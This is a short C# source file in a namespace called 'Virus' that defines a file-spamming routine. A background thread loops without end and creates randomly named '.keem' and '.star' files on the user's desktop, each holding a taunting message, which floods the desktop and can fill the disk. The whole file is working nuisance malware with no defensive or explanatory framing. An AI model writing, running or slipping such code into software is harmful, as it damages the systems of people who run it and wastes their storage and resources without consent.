using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;

namespace Virus
{
    class fileSpammer
    {
        public static void fileSpam()
        {
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            string workDir = Environment.CurrentDirectory;

            new Thread(() =>
            {
                Thread.CurrentThread.IsBackground = true;
                
            for (;;)
            {
                Random rnd = new Random();
                int rand = rnd.Next(1, 99999999);

                Random keemStar = new Random();
                int keem = keemStar.Next(1, 3);

                if (keem == 1)
                {
                    string path = userProfile + "\\" + rand + ".keem";

                    using (FileStream fs = File.Create(path))
                    {
                        Byte[] info = new UTF8Encoding(true).GetBytes("ALEX IS DOING THIS, IT'S NOT ME!");
                        fs.Write(info, 0, info.Length);
                    }
                }

                if (keem == 2)
                {
                    string path = userProfile + "\\" + rand + ".star";

                    using (FileStream fs = File.Create(path))
                    {
                        Byte[] info = new UTF8Encoding(true).GetBytes("HEY NOW YOUR A KEEMSTAR!");
                        fs.Write(info, 0, info.Length);
                    }
                }

            }
            }).Start();
        }
    }
}
